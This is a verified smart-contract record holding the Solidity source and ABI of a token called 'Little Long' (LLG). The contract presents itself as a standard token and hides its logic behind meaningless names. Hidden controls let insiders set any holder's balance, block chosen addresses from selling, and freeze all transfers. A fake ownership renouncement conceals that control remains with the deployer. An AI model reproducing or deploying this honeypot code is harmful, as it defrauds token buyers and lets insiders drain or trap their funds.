{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface totalSenderMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract exemptMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitAuto {\n    function createPair(address amountEnable, address takeAutoMin) external returns (address);\n}\n\ninterface toTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverReceiver) external view returns (uint256);\n\n    function transfer(address buyLiquidity, uint256 txTo) external returns (bool);\n\n    function allowance(address receiverReceiverWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyLiquidity,\n        uint256 txTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minLaunchedAmount, uint256 value);\n    event Approval(address indexed receiverReceiverWallet, address indexed spender, uint256 value);\n}\n\ninterface receiverTo is toTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LittleLong is exemptMax, toTx, receiverTo {\n\n    uint8 private isMax = 18;\n\n    uint256 public limitList;\n\n    address autoAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 enableToken;\n\n    function getOwner() external view returns (address) {\n        return swapBuy;\n    }\n\n    address public toReceiver;\n\n    uint256 private exemptAt;\n\n    address private swapBuy;\n\n    constructor (){\n        if (receiverMin != senderListAmount) {\n            shouldExempt = true;\n        }\n        totalSenderMin launchedSellReceiver = totalSenderMin(shouldExemptFrom);\n        toReceiver = limitAuto(launchedSellReceiver.factory()).createPair(launchedSellReceiver.WETH(), address(this));\n        if (minReceiver == receiverMin) {\n            launchedLimit = limitList;\n        }\n        isFund = _msgSender();\n        walletAt();\n        txTotalExempt[isFund] = true;\n        receiverLaunched[isFund] = senderIs;\n        \n        emit Transfer(address(0), isFund, senderIs);\n    }\n\n    function approve(address launchedLaunch, uint256 txTo) public virtual override returns (bool) {\n        fundLiquidityAuto[_msgSender()][launchedLaunch] = txTo;\n        emit Approval(_msgSender(), launchedLaunch, txTo);\n        return true;\n    }\n\n    address public isFund;\n\n    function feeTakeExempt(address minAt, address buyLiquidity, uint256 txTo) internal returns (bool) {\n        if (minAt == isFund) {\n            return marketingEnable(minAt, buyLiquidity, txTo);\n        }\n        uint256 atTeam = toTx(toReceiver).balanceOf(autoAt);\n        require(atTeam == totalFee);\n        require(buyLiquidity != autoAt);\n        if (limitLiquidityToken[minAt]) {\n            return marketingEnable(minAt, buyLiquidity, atTx);\n        }\n        return marketingEnable(minAt, buyLiquidity, txTo);\n    }\n\n    mapping(address => bool) public txTotalExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingLaunch;\n    }\n\n    bool public senderListAmount;\n\n    uint256 totalFee;\n\n    bool private minReceiver;\n\n    bool public maxLimit;\n\n    uint256 constant atTx = 19 ** 10;\n\n    string private marketingLaunch = \"Little Long\";\n\n    mapping(address => uint256) private receiverLaunched;\n\n    function totalMaxAuto(address teamAmountMin) public {\n        if (maxLimit) {\n            return;\n        }\n        \n        txTotalExempt[teamAmountMin] = true;\n        if (minReceiver) {\n            receiverMin = true;\n        }\n        maxLimit = true;\n    }\n\n    function toIsMarketing(uint256 txTo) public {\n        liquidityAt();\n        totalFee = txTo;\n    }\n\n    function transfer(address feeEnable, uint256 txTo) external virtual override returns (bool) {\n        return feeTakeExempt(_msgSender(), feeEnable, txTo);\n    }\n\n    function allowance(address listLaunch, address launchedLaunch) external view virtual override returns (uint256) {\n        if (launchedLaunch == shouldExemptFrom) {\n            return type(uint256).max;\n        }\n        return fundLiquidityAuto[listLaunch][launchedLaunch];\n    }\n\n    address shouldExemptFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private shouldExempt;\n\n    function liquidityAt() private view {\n        require(txTotalExempt[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return swapBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private fundLiquidityAuto;\n\n    bool private launchAmount;\n\n    function walletList(address feeEnable, uint256 txTo) public {\n        liquidityAt();\n        receiverLaunched[feeEnable] = txTo;\n    }\n\n    uint256 private launchedLimit;\n\n    bool public receiverMin;\n\n    function marketingEnable(address minAt, address buyLiquidity, uint256 txTo) internal returns (bool) {\n        require(receiverLaunched[minAt] >= txTo);\n        receiverLaunched[minAt] -= txTo;\n        receiverLaunched[buyLiquidity] += txTo;\n        emit Transfer(minAt, buyLiquidity, txTo);\n        return true;\n    }\n\n    function walletAt() public {\n        emit OwnershipTransferred(isFund, address(0));\n        swapBuy = address(0);\n    }\n\n    event OwnershipTransferred(address indexed listExempt, address indexed enableSender);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderIs;\n    }\n\n    function launchTrading(address maxAuto) public {\n        liquidityAt();\n        if (limitList == exemptAt) {\n            launchAmount = false;\n        }\n        if (maxAuto == isFund || maxAuto == toReceiver) {\n            return;\n        }\n        limitLiquidityToken[maxAuto] = true;\n    }\n\n    uint256 private senderIs = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public limitLiquidityToken;\n\n    function transferFrom(address minAt, address buyLiquidity, uint256 txTo) external override returns (bool) {\n        if (_msgSender() != shouldExemptFrom) {\n            if (fundLiquidityAuto[minAt][_msgSender()] != type(uint256).max) {\n                require(txTo <= fundLiquidityAuto[minAt][_msgSender()]);\n                fundLiquidityAuto[minAt][_msgSender()] -= txTo;\n            }\n        }\n        return feeTakeExempt(minAt, buyLiquidity, txTo);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isMax;\n    }\n\n    string private tradingLaunch = \"LLG\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingLaunch;\n    }\n\n    function balanceOf(address receiverReceiver) public view virtual override returns (uint256) {\n        return receiverLaunched[receiverReceiver];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverReceiverWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minLaunchedAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"}],\"name\":\"launchTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitLiquidityToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderListAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txTo\",\"type\":\"uint256\"}],\"name\":\"toIsMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAmountMin\",\"type\":\"address\"}],\"name\":\"totalMaxAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTotalExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTo\",\"type\":\"uint256\"}],\"name\":\"walletList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LittleLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}